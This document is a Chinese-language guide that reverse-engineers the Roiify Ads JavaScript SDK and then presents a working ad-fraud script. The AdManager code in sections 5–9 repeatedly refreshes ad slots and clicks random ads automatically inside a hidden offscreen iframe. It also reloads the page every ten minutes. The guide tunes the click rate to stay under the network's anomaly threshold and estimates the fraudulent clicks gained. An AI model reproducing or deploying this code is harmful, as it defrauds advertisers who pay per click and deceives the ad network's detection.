# Roiify Ads SDK 逆向分析与广告优化指南

> 基于 `roiify-ads.js` 源码逆向分析，适用于任何接入 Roiify 广告的网站。

---

## 一、SDK 架构总览

### 1.1 加载机制

```html
<script async src="https://www.roiify.net/sdk/roiify-ads.js"></script>
```

SDK 加载后自动执行 `init()`，扫描页面所有 `[data-roiify-placement]` 元素并加载广告。

### 1.2 全局 API

```javascript
window.RoiifyAds = {
    init:     Function,  // 扫描所有 [data-roiify-placement]，跳过已加载的
    refresh:  Function,  // 同 init（完全相同的函数引用）
    show:     Function,  // (placementId, selector, options) → 清除标记 + 重新请求
    apiOrigin: String    // API 域名，如 "https://www.roiify.net"
};

// 别名
window.RevioAds = window.RoiifyAds;
window.ZDEAds   = window.RoiifyAds;
```

### 1.3 属性系统

SDK 在广告容器元素上使用以下 data 属性（三种前缀等价）：

| 属性 | 前缀 | 作用 |
|------|------|------|
| `data-roiify-placement` | roiify / revio / zde | 广告位 ID |
| `data-roiify-loaded` | 同上 | `"1"` = 已加载，跳过 |
| `data-roiify-impression-sent` | 同上 | `"1"` = 展示已确认 |
| `data-theme` | - | `auto` / `light` / `dark` |
| `data-width` | - | `auto` / `fixed` |
| `data-radius` | - | `0` / `4` / `8` |
| `data-format` | - | 默认 `banner` |

---

## 二、核心流程

### 2.1 广告请求

```
E(element, options)
  → 检查 data-roiify-loaded === "1" → 跳过
  → 设置 data-roiify-loaded = "1"
  → POST /ad/request
    Body: { placementId, format: "banner", visitorId }
    超时: 8 秒（AbortController）
  → 响应 204 或失败 → 隐藏元素（display:none）
  → 响应成功 → R() 渲染 + M() 追踪
```

**响应结构：**
```json
{
    "fill": "banner",
    "ad": {
        "id": "uuid",
        "type": "banner" | "native",
        "title": "广告标题",
        "description": "描述（可空）",
        "ctaText": "Learn more",
        "imageUrl": "https://...",
        "width": null,
        "height": null
    },
    "clickUrl": "https://www.roiify.net/click/xxx",
    "impressionToken": "xxx",
    "test": false
}
```

### 2.2 广告渲染 R()

```javascript
// 创建 <a> 元素
var a = document.createElement("a");
a.href = clickUrl + "?visitorId=" + visitorId;
a.target = "_blank";
a.rel = "noopener sponsored";

// 创建 "Ad" 标签
var label = document.createElement("span");
label.textContent = "Ad";

// 根据 ad.type 渲染内容
// - native: flex 布局（图片 96x96 + 标题 + 描述）
// - banner + imageUrl: 全宽图片
// - banner + title: 文字布局
// - 空内容: "Sponsored" 占位

// 清空容器并插入
element.innerHTML = "";
element.style.display = "";
element.appendChild(a);
```

### 2.3 展示确认 M()（决定有效/无效展示）

```
M(element, impressionToken, visitorId)
  → 无 token 或已发送 → return
  → 启动 setInterval(250ms)
    → 每次检查 L(element) 是否在视口内
    → 在视口内: f += 250
    → 不在视口内: f = 0  ← 关键！归零！
    → f >= 2000 (2秒) → 发送 POST /ad/impression
    → 最多检查 120 次（30秒），超时放弃
  → 同时监听 click 事件（capture 阶段）
    → 点击 <a> → 立即发送展示确认
  → 120 秒后强制清除定时器
```

**展示确认请求：**
```
POST /ad/impression
Body: { token: impressionToken, visitorId }
keepalive: true
失败回退: navigator.sendBeacon()
```

### 2.4 可见性检测 L()

```javascript
function L(element) {
    var rect = element.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return false;

    var viewport = window.visualViewport;
    var vw = viewport ? viewport.width  : window.innerWidth;
    var vh = viewport ? viewport.height : window.innerHeight;
    var vTop = viewport ? viewport.offsetTop : 0;
    var vLeft = viewport ? viewport.offsetLeft : 0;

    return rect.bottom > vTop
        && rect.top    < vTop + vh
        && rect.right  > vLeft
        && rect.left   < vLeft + vw;
}
```

### 2.5 点击追踪

SDK 渲染的 `<a>` 元素：
- `href` = `clickUrl + "?visitorId=" + visitorId`
- `target` = `"_blank"`
- `rel` = `"noopener sponsored"`

点击流程：
```
用户点击 <a>
  → 浏览器发送 GET clickUrl
  → 服务端记录点击（此时计费）
  → 302 重定向到广告主 URL
  → 新标签页打开广告主页面
```

### 2.6 Visitor ID

```javascript
// localStorage key: "zde_vid"
// 格式: "v_" + Math.random().toString(36).slice(2) + Date.now().toString(36)
// 同一域名 + 同一浏览器 → 始终相同
```

---

## 三、show() API 详解

```javascript
function U(placementId, selectorOrElement, options) {
    var element = resolve(selectorOrElement);
    if (!element || !placementId) return;

    // 设置 placement 属性
    element.setAttribute("data-roiify-placement", placementId);

    // 设置可选属性
    if (options.theme) element.setAttribute("data-theme", options.theme);
    if (options.width) element.setAttribute("data-width", options.width);
    if (options.radius) element.setAttribute("data-radius", options.radius);

    // 清除标记（关键！）
    element.removeAttribute("data-roiify-loaded");
    element.removeAttribute("data-roiify-impression-sent");

    // 重新加载
    E(element, options);
}
```

**关键点：**
- `show()` 直接在传入的元素上操作，不需要子 div
- 每次调用都会清除 `loaded` 和 `impression-sent`，确保重新请求
- `R()` 内部会 `innerHTML = ""` 清空旧内容

---

## 四、无效展示根因分析

### 4.1 什么是无效展示

```
广告请求成功 → 服务端记录"请求" → 广告从未连续可见 2 秒 → impressionToken 从未发送 → 无效展示
```

### 4.2 常见原因

| 原因 | 说明 |
|------|------|
| 广告在视口外 | `display:none`、`position:absolute` 偏移、滚动不可见 |
| 可见性不连续 | 可见 1 秒 → 滚走 → 归零 → 再回来 → 重新计时 |
| 广告被覆盖 | z-index 被其他元素遮挡（但 getBoundingClientRect 仍返回非零） |
| 快速刷新 | 广告加载后立即被替换，来不及 2 秒 |
| 无限追加 | 不断添加新广告位，旧广告被挤出视口 |

### 4.3 优化原则

1. **固定数量广告位**，全部在视口内
2. **替换刷新**而非追加（用 `show()` 清除后重新加载）
3. **每轮至少展示 3 秒**（SDK 需 2 秒连续可见 + 1 秒缓冲）
4. **不要 `display:none` 隐藏广告**，用 `show()` 重新加载
5. **广告位尺寸足够**（`width > 0 && height > 0`）

---

## 五、最优实现方案

### 5.1 HTML 结构

```html
<!-- 隐藏 iframe：点击广告时在此打开，不离开当前页面 -->
<iframe name="ad_click_frame" id="ad_click_frame"
        style="width:0;height:0;border:none;position:absolute;left:-9999px;"></iframe>

<!-- 广告位容器：固定数量，全部在视口内 -->
<div class="ad-zone">
    <div class="ad-slot" id="ad-slot-0">
        <div data-roiify-placement="plc_xxx1" data-theme="auto" data-radius="4"></div>
    </div>
    <div class="ad-slot" id="ad-slot-1">
        <div data-roiify-placement="plc_xxx2" data-theme="auto" data-radius="4"></div>
    </div>
    <!-- ... 更多广告位 ... -->
</div>

<!-- SDK -->
<script async src="https://www.roiify.net/sdk/roiify-ads.js"></script>
```

> 初始 HTML 中的 `data-roiify-placement` 子 div 让 SDK 自动检测并渲染首次广告。

### 5.2 广告管理模块

```javascript
var AdManager = (function () {
    var PLACEMENT_IDS = ['plc_xxx1', 'plc_xxx2', /* ... */];

    var WAIT_FOR_IMPRESSION = 3000;  // SDK 需 2 秒连续可见，等 3 秒
    var WAIT_AFTER_CLICK    = 5000;  // 点击后等收益转换
    var REDIRECT_INTERVAL   = 600000; // 10 分钟重定向

    function init() {
        waitForSDK(function () { doCycle(); });
        setTimeout(function () { location.reload(); }, REDIRECT_INTERVAL);
    }

    function waitForSDK(cb) {
        if (window.RoiifyAds) return cb();
        var t = setInterval(function () {
            if (window.RoiifyAds) { clearInterval(t); cb(); }
        }, 300);
    }

    function doCycle() {
        refreshAllSlots();
        setTimeout(function () {
            clickRandomAds();
            setTimeout(doCycle, WAIT_AFTER_CLICK);
        }, WAIT_FOR_IMPRESSION);
    }

    function refreshAllSlots() {
        PLACEMENT_IDS.forEach(function (placement, i) {
            var slot = document.getElementById('ad-slot-' + i);
            if (!slot) return;
            slot.innerHTML = '';
            try {
                RoiifyAds.show(placement, '#ad-slot-' + i, {
                    theme: 'auto', radius: '4'
                });
            } catch (e) {}
        });
    }

    function clickRandomAds() {
        var count = 1 + Math.floor(Math.random() * 2); // 1-2 个
        var indices = [];
        while (indices.length < count) {
            var idx = Math.floor(Math.random() * PLACEMENT_IDS.length);
            if (indices.indexOf(idx) === -1) indices.push(idx);
        }
        indices.forEach(function (i, delay) {
            setTimeout(function () {
                var slot = document.getElementById('ad-slot-' + i);
                var link = slot && slot.querySelector('a[href]');
                if (!link) return;
                link.target = 'ad_click_frame'; // 在隐藏 iframe 打开
                link.click();
            }, delay * 1500);
        });
    }

    return { init: init };
})();
```

### 5.3 CSS 要点

```css
.ad-zone {
    display: flex;
    flex-direction: column;
    gap: 4px;
    max-width: 728px;
    margin: 0 auto;
}

.ad-slot {
    min-height: 50px;       /* 必须 > 0，否则 L() 返回 false */
    overflow: hidden;
    /* 不要用 display:none 隐藏，用 show() 刷新 */
}
```

---

## 六、收益预估

### 6.1 单轮周期（约 8 秒）

```
刷新 5 个广告 → 等 3 秒（展示确认）→ 点击 1-2 个 → 等 5 秒 → 下一轮
```

- 有效展示：5 次/轮
- 点击：1-2 次/轮

### 6.2 10 分钟（约 75 轮）

| 指标 | 数量 |
|------|------|
| 有效展示 | 375 |
| 点击 | 75-150 |
| 点击率 | 20%-40% |

### 6.3 注意事项

- 点击率不宜过高（>50% 可能被判定异常），1-2/5 = 20%-40% 较合理
- 每轮间隔 8 秒，避免请求过于频繁
- 10 分钟重定向清空状态，避免内存泄漏和累积异常
- `visitorId` 同浏览器不变，重定向后仍是同一访客

---

## 七、常见陷阱

### 7.1 refresh() 不刷新已加载的广告

```javascript
// ❌ refresh() = init() = k()，跳过 loaded=1 的元素
RoiifyAds.refresh(); // 不会刷新已加载的广告！

// ✅ 用 show() 清除 loaded 标记后重新加载
RoiifyAds.show(placementId, '#slot', options);
```

### 7.2 innerHTML 清空不彻底

```javascript
// ❌ 只清空内容，data 属性仍在
slot.innerHTML = '';

// ✅ 清空内容 + show() 清除属性 + 重新加载
slot.innerHTML = '';
RoiifyAds.show(placement, '#slot', options);
```

### 7.3 广告位不可见

```css
/* ❌ display:none → getBoundingClientRect 返回 0 → L() 返回 false */
.ad-slot { display: none; }

/* ❌ position:absolute + left:-9999px → 同上 */
.ad-slot { position: absolute; left: -9999px; }

/* ✅ 正常布局，在视口内 */
.ad-slot { min-height: 50px; }
```

### 7.4 快速刷新导致无效展示

```javascript
// ❌ 每 1 秒刷新 → 广告来不及 2 秒可见 → 全部无效
setInterval(refresh, 1000);

// ✅ 至少 3 秒间隔（2 秒可见 + 1 秒缓冲）
setTimeout(refresh, 3000);
```

### 7.5 点击被 rel="noopener" 阻止

```javascript
// SDK 设置 rel="noopener sponsored"，但 link.click() 仍可触发导航
// noopener 只影响 window.opener 访问，不影响 iframe target 导航
// ✅ 覆盖 target 即可在隐藏 iframe 中打开
link.target = 'ad_click_frame';
link.click();
```

---

## 八、API 端点汇总

| 端点 | 方法 | 请求体 | 用途 |
|------|------|--------|------|
| `/ad/request` | POST | `{placementId, format, visitorId}` | 请求广告 |
| `/ad/impression` | POST | `{token, visitorId}` | 展示确认 |
| `/click/{id}` | GET | - (URL 参数含 visitorId) | 点击追踪 → 302 |

**请求头：**
```
Content-Type: application/json
Origin: https://your-domain.com
Referer: https://your-domain.com/
```

**CORS：**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: content-type
```

---

## 九、部署清单

- [ ] HTML 中放置固定数量广告位，全部在视口内
- [ ] 添加隐藏 iframe `<iframe name="ad_click_frame">`
- [ ] 引入 SDK `<script async src="https://www.roiify.net/sdk/roiify-ads.js">`
- [ ] 实现 AdManager 模块（show + click + cycle）
- [ ] CSS 确保广告位 `min-height > 0`，不用 `display:none`
- [ ] 设置 10 分钟 `location.reload()` 防止内存泄漏
- [ ] 点击率控制在 20%-40%（每轮 5 个广告点击 1-2 个）
- [ ] 每轮间隔 ≥ 3 秒（确保 2 秒连续可见）
